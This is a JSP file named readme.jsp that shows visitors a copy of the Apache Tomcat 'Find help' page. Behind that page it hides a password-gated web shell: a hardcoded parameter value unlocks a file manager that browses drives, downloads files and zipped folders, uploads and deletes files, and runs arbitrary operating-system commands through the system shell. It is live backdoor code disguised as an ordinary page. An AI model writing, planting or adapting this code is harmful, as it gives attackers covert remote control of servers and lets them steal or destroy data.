<%@ page language="java" contentType="text/html;charset=utf-8" %>
<%
String pageMsg="<html>"+
"<head>"+
"<META http-equiv=\"Content-Type\" content=\"text/html;charset=utf-8\">"+
"<title>Apache Tomcat - Find Help</title>"+
"<link type=\"text/css\" href=\"stylesheets/tomcat.css\" rel=\"stylesheet\">"+
"<link type=\"text/css\" href=\"stylesheets/tomcat-printer.css\" rel=\"stylesheet\" media=\"print\">"+
"</head>"+
"<body bgcolor=\"#ffffff\" text=\"#000000\" link=\"#525D76\" alink=\"#525D76\" vlink=\"#525D76\">"+
"<table border=\"0\" width=\"100%\" cellspacing=\"0\">"+
"<!--PAGE HEADER-->"+
"<tr>"+
"<td>"+
"<!--PROJECT LOGO--><a href=\"http://tomcat.apache.org/\"><img src=\"http://tomcat.apache.org/images/tomcat.gif\" align=\"left\" alt=\"Tomcat Logo\" border=\"0\"></a></td><td><font face=\"arial,helvetica,sanserif\">"+
"<h1>Apache Tomcat</h1>"+
"</font></td><td>"+
"<!--APACHE LOGO--><a href=\"http://www.apache.org/\"><img src=\"http://www.apache.org/images/asf-logo.gif\" align=\"right\" alt=\"Apache Logo\" border=\"0\"></a></td>"+
"</tr>"+
"</table>"+
"<div class=\"searchbox noPrint\">"+
"<form action=\"http://www.google.com/search\" method=\"get\">"+
"<input value=\"tomcat.apache.org\" name=\"sitesearch\" type=\"hidden\"><input value=\"Search the Site\" size=\"25\" name=\"q\" id=\"query\" type=\"text\"><input name=\"Search\" value=\"Search Site\" type=\"submit\">"+
"</form>"+
"</div>"+
"<table border=\"0\" width=\"100%\" cellspacing=\"4\">"+
"<!--HEADER SEPARATOR-->"+
"<tr>"+
"<td colspan=\"2\">"+
"<hr noshade size=\"1\">"+
"</td>"+
"</tr>"+
"<tr>"+
"<!--LEFT SIDE NAVIGATION-->"+
"<td width=\"20%\" valign=\"top\" nowrap=\"true\" class=\"noPrint\">"+
"<p>"+
"<strong>Apache Tomcat</strong>"+
"</p>"+
"<ul>"+
"<li>"+
"<a href=\"http://tomcat.apache.org/index.html\">Home</a>"+
"</li>"+
"<li>"+
"<a href=\"http://tomcat.apache.org/taglibs/\">Taglibs</a>"+
"</li>"+
"<li>"+
"<a href=\"http://tomcat.apache.org/maven-plugin.html\">Maven Plugin</a>"+
"</li>"+
"</ul>"+
"<p>"+
"<strong>Download</strong>"+
"</p>"+
"<ul>"+
"<li>"+
"<a href=\"http://tomcat.apache.org/whichversion.html\">Which version?</a>"+
"</li>"+
"<li>"+
"<a href=\"http://tomcat.apache.org/download-70.cgi\">Tomcat 7.0</a>"+
"</li>"+
"<li>"+
"<a href=\"http://tomcat.apache.org/download-60.cgi\">Tomcat 6.0</a>"+
"</li>"+
"<li>"+
"<a href=\"http://tomcat.apache.org/download-connectors.cgi\">Tomcat Connectors</a>"+
"</li>"+
"<li>"+
"<a href=\"http://tomcat.apache.org/download-native.cgi\">Tomcat Native</a>"+
"</li>"+
"<li>"+
"<a href=\"http://archive.apache.org/dist/tomcat/\">Archives</a>"+
"</li>"+
"</ul>"+
"<p>"+
"<strong>Documentation</strong>"+
"</p>"+
"<ul>"+
"<li>"+
"<a href=\"http://tomcat.apache.org/tomcat-7.0-doc/index.html\">Tomcat 7.0</a>"+
"</li>"+
"<li>"+
"<a href=\"http://tomcat.apache.org/tomcat-6.0-doc/index.html\">Tomcat 6.0</a>"+
"</li>"+
"<li>"+
"<a href=\"http://tomcat.apache.org/connectors-doc/\">Tomcat Connectors</a>"+
"</li>"+
"<li>"+
"<a href=\"http://tomcat.apache.org/native-doc/\">Tomcat Native</a>"+
"</li>"+
"<li>"+
"<a href=\"http://wiki.apache.org/tomcat/FrontPage\">Wiki</a>"+
"</li>"+
"<li>"+
"<a href=\"http://tomcat.apache.org/migration.html\">Migration Guide</a>"+
"</li>"+
"</ul>"+
"<p>"+
"<strong>Problems?</strong>"+
"</p>"+
"<ul>"+
"<li>"+
"<a href=\"http://tomcat.apache.org/security.html\">Security Reports</a>"+
"</li>"+
"<li>"+
"<a href=\"http://tomcat.apache.org/findhelp.html\">Find help</a>"+
"</li>"+
"<li>"+
"<a href=\"http://wiki.apache.org/tomcat/FAQ\">FAQ</a>"+
"</li>"+
"<li>"+
"<a href=\"http://tomcat.apache.org/lists.html\">Mailing Lists</a>"+
"</li>"+
"<li>"+
"<a href=\"http://tomcat.apache.org/bugreport.html\">Bug Database</a>"+
"</li>"+
"<li>"+
"<a href=\"http://tomcat.apache.org/irc.html\">IRC</a>"+
"</li>"+
"</ul>"+
"<p>"+
"<strong>Get Involved</strong>"+
"</p>"+
"<ul>"+
"<li>"+
"<a href=\"http://tomcat.apache.org/getinvolved.html\">Overview</a>"+
"</li>"+
"<li>"+
"<a href=\"http://tomcat.apache.org/svn.html\">SVN Repositories</a>"+
"</li>"+
"<li>"+
"<a href=\"http://tomcat.apache.org/ci.html\">Buildbot</a>"+
"</li>"+
"<li>"+
"<a href=\"https://reviews.apache.org/groups/tomcat/\">Reviewboard</a>"+
"</li>"+
"<li>"+
"<a href=\"http://tomcat.apache.org/tools.html\">Tools</a>"+
"</li>"+
"</ul>"+
"<p>"+
"<strong>Media</strong>"+
"</p>"+
"<ul>"+
"<li>"+
"<a href=\"http://blogs.apache.org/tomcat/\">Blog</a>"+
"</li>"+
"<li>"+
"<a href=\"http://twitter.com/theapachetomcat\">Twitter</a>"+
"</li>"+
"</ul>"+
"<p>"+
"<strong>Misc</strong>"+
"</p>"+
"<ul>"+
"<li>"+
"<a href=\"http://tomcat.apache.org/whoweare.html\">Who We Are</a>"+
"</li>"+
"<li>"+
"<a href=\"http://tomcat.apache.org/heritage.html\">Heritage</a>"+
"</li>"+
"<li>"+
"<a href=\"http://www.apache.org\">Apache Home</a>"+
"</li>"+
"<li>"+
"<a href=\"http://tomcat.apache.org/resources.html\">Resources</a>"+
"</li>"+
"<li>"+
"<a href=\"http://tomcat.apache.org/contact.html\">Contact</a>"+
"</li>"+
"<li>"+
"<a href=\"http://tomcat.apache.org/legal.html\">Legal</a>"+
"</li>"+
"<li>"+
"<a href=\"http://www.apache.org/foundation/sponsorship.html\">Sponsorship</a>"+
"</li>"+
"<li>"+
"<a href=\"http://www.apache.org/foundation/thanks.html\">Thanks</a>"+
"</li>"+
"</ul>"+
"</td>"+
"<!--RIGHT SIDE MAIN BODY--><td width=\"80%\" valign=\"top\" align=\"left\" id=\"mainBody\">"+
"<table border=\"0\" cellspacing=\"0\" cellpadding=\"2\" width=\"100%\">"+
"<tr>"+
"<td bgcolor=\"#525D76\"><font color=\"#ffffff\" face=\"arial,helvetica,sanserif\"><a name=\"Find help\">"+
"<!--()--></a><a name=\"Find_help\"><strong>Find help</strong></a></font></td>"+
"</tr>"+
"<tr>"+
"<td>"+
"<p>"+
"<blockquote>"+
""+
""+
"<p>Apache Tomcat support is provided by the community,for the community,on a"+
"purely volunteer basis. This page has been written to help you find the help you"+
"need whilst making the most efficient use of the resources available. The types"+
"of help are presented in the same order they are typically used.</p>"+
""+
""+
"<p>The first resource to check is the documentation. In addition to the Tomcat"+
"documentation(make sure you check the documentation for the version you are"+
"using)you should also check the relevant Servlet and/or JSP"+
"<a href=\"http://wiki.apache.org/tomcat/Specifications\">Specification</a> documents."+
"Much of Tomcat's behaviour is determined by these specifications and the information in"+
"them is not typically duplicated in the Tomcat documentation.</p>"+
""+
""+
"<p>The documentation is searchable &ndash;see input box at the top of the"+
"page. To limit results to a specific major version of Apache Tomcat you can"+
"add the number to the search string,wrapping it in quotes,e.g. \"6.0\".</p>"+
""+
""+
"<p>The logs which Apache Tomcat generates can be a valuable resource when trying"+
"to diagnose a problem. Please review them. You may want to enable debug output"+
"in your Apache Tomcat configuration so that you have more information to help"+
"diagnose the problem.</p>"+
""+
""+
"<p>It is unusual to find a problem that has never been reported. The chances are"+
"that your question has been asked and answered by somebody else. Use your"+
"favourite search engine to try and find it.</p>"+
""+
""+
"<p>Answers to very common questions are documented on the"+
"<a href=\"http://wiki.apache.org/tomcat/FAQ\">FAQ</a>.</p>"+
""+
""+
"<p>The archives for the user mailing list are a rich source of useful"+
"information. Use the search features provided by one of them. A"+
"<a href=\"lists.html\">selection of archives</a> is provided on the mailing list"+
"page.</p>"+
""+
""+
"<p>If you have already subscribed to the relevant mailing list,"+
"you can ask about the problem on there. If you are not subscribed,you"+
"will need to subscribe before you can send your question to either of these"+
"lists. The <a href=\"lists.html\">mailing list</a> pages provide further"+
"information on how to use the mailing lists as well as subscription"+
"instructions.</p>"+
""+
""+
"<p>If you have found a bug or propose an enhancement,follow the documented"+
"<a href=\"bugreport.html\">bug reporting</a> steps. Please note,that Bugzilla"+
"is not a support forum. If you need help with your problem,use the users"+
"<a href=\"lists.html\">mailing list</a>.</p>"+
""+
""+
"<p>There is also an <a href=\"irc.html\">IRC channel</a> dedicated to Tomcat.</p>"+
""+
""+
"<p>A list of organisations that provide support and training for Apache Tomcat"+
"is maintained on the"+
"<a href=\"http://wiki.apache.org/tomcat/SupportAndTraining\">Tomcat Wiki</a>.</p>"+
""+
""+
"</blockquote>"+
"</p>"+
"</td>"+
"</tr>"+
"<tr>"+
"<td>"+
"<br>"+
"</td>"+
"</tr>"+
"</table>"+
"</td>"+
"</tr>"+
"<!--FOOTER SEPARATOR-->"+
"<tr>"+
"<td colspan=\"2\">"+
"<hr noshade size=\"1\">"+
"</td>"+
"</tr>"+
"<!--PAGE FOOTER-->"+
"<tr>"+
"<td colspan=\"2\">"+
"<div align=\"center\">"+
"<font color=\"#525D76\" size=\"-1\"><em>"+
" Copyright &copy;1999-2013,The Apache Software Foundation"+
" <br>"+
" Apache Tomcat,Tomcat,Apache,the Apache feather,and the Apache Tomcat project logo are trademarks of the Apache Software Foundation. </em></font></div></td></tr></table></body></html>";if(session.getAttribute("FileSystemUser")==null){if(!"271828".equals(request.getParameter("c"))){out.println(pageMsg);return;}session.setAttribute("FileSystemUser","admin");}String myself="readme.jsp";String system=System.getProperty("os.name");String pathDiv="\\";if(system.toLowerCase().indexOf("windows")==-1){pathDiv="/";}String exeRest=(String)request.getAttribute("exeRest");if(exeRest==null)exeRest="";class UploadBean{private String savePath="";private ServletInputStream sis=null;private byte[] b=new byte[4096];public UploadBean(String savePath,int size){this.savePath=savePath;}public void setSourceFile(HttpServletRequest request)throws java.io.IOException{sis=request.getInputStream();java.io.FileOutputStream out=null;String s="";String fileName="";String endStr="";for(int i=0;i < 6;i++)endStr=endStr+"-";try{int len=-1,site=0;while((len=sis.readLine(b,0,b.length))!=-1){s=new String(b,0,len,"utf-8");if((site=s.indexOf("filename=\""))!=-1){s=s.substring(site+10);site=s.indexOf("\"");fileName=s.substring(0,site);fileName=java.net.URLDecoder.decode(fileName,"utf-8");out=new java.io.FileOutputStream(savePath+fileName);}else if(s.indexOf("Content-Type:")!=-1){sis.readLine(b,0,b.length);break;}}while((len=sis.read(b))!=-1){s=new String(b,0,len,"utf-8");if(s.indexOf(endStr)!=-1){int n=0;for(int i=0;i < b.length;i++){if(b[i]=='-')n++;else n=0;if(n==6){site=i;break;};}out.write(b,0,site - 7);break;}out.write(b,0,len);}}catch(java.io.IOException ioe){}finally{try{if(sis !=null)sis.close();}catch(Exception e){}try{if(out !=null)out.close();}catch(Exception e){}}}}class FileBO{public java.util.ArrayList tempList=new java.util.ArrayList();/** * 得到文件的大小，包括文件夹和一般文件 * @param file */ public long getFileSize(java.io.File fileT){if(fileT==null)return -1;long fileSize=0;if(fileT.isFile())fileSize=fileT.length();else{java.io.File[] files=fileT.listFiles();for(int i=0;i < files.length;i++){fileSize=fileSize+getFileSize(files[i]);}}return fileSize;}public java.util.ArrayList getFileList(java.io.File fileT){if(fileT==null)return null;java.util.ArrayList folderList=new java.util.ArrayList();java.util.ArrayList fileList=new java.util.ArrayList();if(fileT.isFile())fileList.add(fileT);else{java.io.File[] files=fileT.listFiles();if(files !=null){for(int i=0;i < files.length;i++){if(files[i].isDirectory())folderList.add(files[i]);else fileList.add(files[i]);}}}for(int i=0;i < fileList.size();i++)folderList.add(fileList.get(i));return folderList;}public void deleteFile(java.io.File fileT){if(fileT==null);if(fileT.isFile())fileT.delete();else{java.io.File[] files=fileT.listFiles();for(int i=0;i < files.length;i++){deleteFile(files[i]);}fileT.delete();}}public String exeCmd(String cmd)throws java.io.IOException{String exeRest="";String[] cmds=new String[]{"","",""};String system=System.getProperty("os.name");if(system.toLowerCase().indexOf("windows")==-1)cmds=new String[]{"/bin/sh","-c",""};else cmds=new String[]{"cmd","/C",""};cmds[2]=cmd;Runtime r=Runtime.getRuntime();Process p=null;java.io.BufferedReader br=null;try{p=r.exec(cmds);br=new java.io.BufferedReader( new java.io.InputStreamReader(p .getInputStream()));String inline;while((inline=br.readLine())!=null){exeRest=exeRest+inline+"<br/>";}br.close();p.destroy();}catch(java.io.IOException e){try{if(br !=null)br.close();}catch(Exception e1){}try{if(p !=null)p.destroy();}catch(Exception e1){}return e.getMessage();}return exeRest;}}class ZipUtil{public byte [] zip(String fileName){java.util.zip.ZipOutputStream out=null;java.io.ByteArrayOutputStream bos=null;try{bos=new java.io.ByteArrayOutputStream();out=new java.util.zip.ZipOutputStream(bos);zip(out,new java.io.File(fileName),"");out.close();return bos.toByteArray();}catch(Exception e){return null;}finally{try{if(out !=null)out.close();}catch(Exception e){}try{if(bos !=null)bos.close();}catch(Exception e){}}}private void zip(java.util.zip.ZipOutputStream out,java.io.File f,String base)throws Exception{if(f.isDirectory()){java.io.File[] fl=f.listFiles();out.putNextEntry(new java.util.zip.ZipEntry(base+"/"));base=base.length()==0 ? "" : base+"/";for(int i=0;i < fl.length;i++)zip(out,fl[i],base+fl[i].getName());}else{out.putNextEntry(new java.util.zip.ZipEntry(base));java.io.FileInputStream fileInStream=new java.io.FileInputStream(f);byte[] buffer=new byte[1024];int len=0;while((len=fileInStream.read(buffer))!=-1)out.write(buffer,0,len);fileInStream.close();}}}java.util.ArrayList fileList=null;FileBO fb=new FileBO();String operateNo=request.getParameter("operateNo");if(operateNo !=null){if(operateNo.equals("downloadFile")){java.io.File curFile=(java.io.File)session.getAttribute("curFile");java.util.List curFileList=(java.util.List)session.getAttribute("fileList");String fileNo=request.getParameter("fileNo");fileList=(java.util.ArrayList)session.getAttribute("fileList");java.io.File temp=(java.io.File)fileList.get(Integer.parseInt(fileNo));java.io.InputStream is=null;java.io.OutputStream os=null;is=new java.io.FileInputStream(temp);os=response.getOutputStream();response.reset();response .setContentType("application/x-msdownload;charset=utf-8");response.addHeader("Content-Disposition","attachment;filename="+java.net.URLEncoder.encode( temp.getName(),"utf-8"));byte[] b=new byte[1024];int len;while((len=is.read(b))> 0)os.write(b,0,len);os.flush();is.close();os.close();session.setAttribute("curFile",curFile);session.setAttribute("fileList",curFileList);return;}}if(operateNo !=null){fileList=new java.util.ArrayList();if(operateNo.equals("disk")){for(int i='c';i < 'z';i++){byte[] b=new byte[1];b[0]=(byte)i;java.io.File disk=new java.io.File(new String(b)+":\\");if(disk.exists()){fileList.add(disk);}}session.setAttribute("curFile",(java.io.File)fileList.get(0));session.setAttribute("fileList",fileList);}else if(operateNo.equals("parentList")){java.io.File temp=(java.io.File)session.getAttribute("curFile");if(temp.getParent()!=null){java.io.File parentFile=new java.io.File(temp.getParent());fileList=fb.getFileList(parentFile);if(fileList==null){fileList=fb.tempList;}session.setAttribute("curFile",parentFile);}else{fileList=fb.getFileList(temp);session.setAttribute("curFile",temp);}session.setAttribute("fileList",fileList);}else if(operateNo.equals("childList")){String folderNo=request.getParameter("folderNo");fileList=(java.util.ArrayList)session.getAttribute("fileList");java.io.File temp=(java.io.File)fileList.get(Integer.parseInt(folderNo));if(temp !=null && temp.isDirectory()){fileList=fb.getFileList(temp);session.setAttribute("curFile",temp);session.setAttribute("fileList",fileList);}}else if(operateNo.equals("deleteFile")){String folderNo=request.getParameter("folderNo");fileList=(java.util.ArrayList)session.getAttribute("fileList");java.io.File temp=(java.io.File)fileList.get(Integer.parseInt(folderNo));fb.deleteFile(temp);temp=(java.io.File)session.getAttribute("curFile");fileList=fb.getFileList(temp);session.setAttribute("curFile",temp);session.setAttribute("fileList",fileList);}else if(operateNo.equals("createFolder")){String folderName=new String(request.getParameter( "folderName").getBytes("iso8859-1"),"utf-8");java.io.File temp=(java.io.File)session.getAttribute("curFile");temp=new java.io.File(temp.getAbsolutePath()+pathDiv+folderName);temp.mkdir();temp=(java.io.File)session.getAttribute("curFile");fileList=fb.getFileList(temp);session.setAttribute("curFile",temp);session.setAttribute("fileList",fileList);}else if(operateNo.equals("uploadFile")){java.io.File root=(java.io.File)session.getAttribute("curFile");int fileSize=64 * 1024 * 1024;UploadBean uploadBean=new UploadBean(root .getAbsolutePath()+pathDiv,fileSize);uploadBean.setSourceFile(request);fileList=fb.getFileList(root);session.setAttribute("curFile",root);session.setAttribute("fileList",fileList);}else if(operateNo.equals("exe")){String cmd=request.getParameter("cmd");if(cmd==null || cmd.length()==0)exeRest="";else exeRest=fb.exeCmd(cmd);request.setAttribute("exeRest",exeRest);}else if(operateNo.equals("downloadZip")){try{String zipFilePath=((java.io.File)session.getAttribute("curFile")).getAbsolutePath();String zipFileName="";if(system.toLowerCase().indexOf("windows")==-1){zipFileName=zipFilePath.substring(zipFilePath.lastIndexOf("/")+1);}else zipFileName=zipFilePath.substring(zipFilePath.lastIndexOf("\\")+1);if(zipFileName.length()> 0){byte [] b=new ZipUtil().zip(zipFilePath);response.reset();	response.setContentType("application/octet-stream");	response.setHeader("Content-Disposition","attachment;filename=\""+zipFileName+".zip\"");	ServletOutputStream outtmp=response.getOutputStream();	outtmp.write(b);	outtmp.flush();	outtmp.close();}}catch(Exception e){}}else{java.io.File temp=new java.io.File("");temp=new java.io.File(temp.getAbsolutePath());fileList=fb.getFileList(temp);session.setAttribute("curFile",temp);session.setAttribute("fileList",fileList);}}else{java.io.File temp=new java.io.File("");temp=new java.io.File(temp.getAbsolutePath());fileList=fb.getFileList(temp);session.setAttribute("curFile",temp);session.setAttribute("fileList",fileList);}if(fileList !=null)fb.tempList=fileList;%> <!DOCTYPE HTML> <html> <head> <meta http-equiv="Content-Type" content="text/html;charset=gb2312"> <meta name="viewport" content="user-scalable=no,width=device-width" /> <style type="text/css"> body{background-color: #dddddd;font-family: Arial,Helvetica,sans-serif;font-size: 12px;line-height: 24px;}td,th{font-family: Arial,Helvetica,sans-serif;font-size: 12px;line-height: 24px;color: #000000;font-style: normal;font-weight: bolder;font-variant: normal;background-color: #ffffff;border-top-width: 0px;border-right-width: 0px;border-bottom-width: 0px;border-left-width: 0px;border-top-style: dotted;border-right-style: dotted;border-bottom-style: none;border-left-style: none;border-top-color: #000000;border-right-color: #000000;border-bottom-color: #000000;border-left-color: #000000;}input{color: #000000;background-color: #ffffff;border: 1px #bbbbbb solid;padding-top: 2px;}.style1{font-size: 12px}</style> <script language="JavaScript"> function deleteCheck(url,fileName){try{if(confirm("delete\" "+fileName+"\" confarm?"))location.href=url;}catch(e){alert(e);}}function downloadZipCheck(url){try{if(confirm("download confarm?"))location.href=url;}catch(e){alert(e);}}</script> <title>file manager</title> </head> <body> <div align="left"> <strong><%=request.getLocalAddr()+":"+request.getLocalPort()%>&nbsp;&nbsp;<%=system%> &nbsp;&nbsp;<%=(((java.io.File)session.getAttribute("curFile")).getAbsolutePath())%> </strong> </div> <form name="fileForm" action="" method="post"> <input name="cmd" type="hidden" value="" /> <% if(System.getProperty("os.name").toLowerCase().indexOf("windows")>=0){%> <input type="button" value="Computer" style="width:70px;height:30px;font-size: 12px" onClick="location.href='<%=myself%>?operateNo=disk'"> <%}%> <input type="button" value="Up" style="width:40px;height:30px;font-size: 12px" onClick="location.href='<%=myself%>?operateNo=parentList'"> <input type="button" value="Download folder(zip)" style="width:150px;height:30px;font-size: 12px" onClick="downloadZipCheck('<%=myself%>?operateNo=downloadZip')"> <br/> <input name="folderName" type="text" id="folderName" size="10" maxlength="20" style="width:171px;height:25px;font-size: 12px" > <input type="button" name="add" style="width:90px;height:30px;font-size: 12px" value="Create Folder" onClick="createFolder()"> <br/> </form> <form name="uploadForm" action="<%=myself%>?operateNo=uploadFile" enctype="multipart/form-data" method="post"> <input name="uploadFile0" id="uploadFile0" type='file' style="width:172px;height:26px;font-size: 12px;margin-top:-3px" size='20'> <input type="submit" name="upload" value="Upload" style="width:60px;height:30px;font-size: 12px;"  onclick="return uploadFileCount>=1&&document.getElementById('uploadFile0').value.length>0;"> </form> <input type="text" name="cmd" id="cmd" value="" style="width:171px;height:26px;font-size: 12px" /> <input type="button" name="exe" value="Run CMD" onClick="exeCmd()" style="width:90px;height:30px;font-size: 12px" /> <br /> <table width="100%"> <% if(fileList !=null)for(int i=0;i < fileList.size();i++){java.io.File file=(java.io.File)fileList.get(i);String fileName=file.getName();try{fileName=java.net.URLDecoder .decode(fileName,"utf-8");}catch(Exception e){}if(file.isDirectory()){%> <tr> <td align="left" <%=i % 2==1 ? "style='background-color: #dafbda;'" : ""%>> <a href="<%=myself%>?operateNo=childList&folderNo=<%=i%>"> <%=file.getParent()!=null ? fileName : file.getAbsolutePath()%></a> </td> <td align="right" width="70" <%=i % 2==1 ? "style='background-color: #dafbda;'" : ""%>> <a href="javascript:deleteCheck('<%=myself%>?operateNo=deleteFile&folderNo=<%=i%>','<%=fileName%>')">del</a> </td> </tr> <%}else{String fileSize="";if(file.length()/(1024 * 1024)>=1)fileSize=file.length()/(1024 * 1024)+"M";else fileSize=(file.length()/ 1024 < 1 ? 1 : file .length()/ 1024)+"K";%><tr> <td align="left" <%=i % 2==1 ? "style='background-color: #dafbda;'" : ""%>> <a href="<%=myself%>?operateNo=downloadFile&fileNo=<%=i%>"><%=fileName%></a> </td> <td align="right" width="70" <%=i % 2==1 ? "style='background-color: #dafbda;'" : ""%>><%=fileSize%> <a href="javascript:deleteCheck('<%=myself%>?operateNo=deleteFile&folderNo=<%=i%>','<%=fileName%>')">del</a> </td> </tr> <%}}%> </table> <%=exeRest.replaceAll(" ","&nbsp;")%><SCRIPT LANGUAGE="JavaScript"> var checked=false;function createFolder(){document.fileForm.action="<%=myself%>?operateNo=createFolder";document.fileForm.submit();}function exeCmd(){document.fileForm.action="<%=myself%>?operateNo=exe";var cmd=document.getElementById("cmd").value;if(cmd.length==0)return;document.fileForm.cmd.value=cmd;document.fileForm.submit();}function downloadFile(url){window.open(url,"userReInfo","width=300,height=300,toolbar=no,menubar=no,scrollbars=no,resizable=no,location=no,status=no");}</script>
</body>
</html>
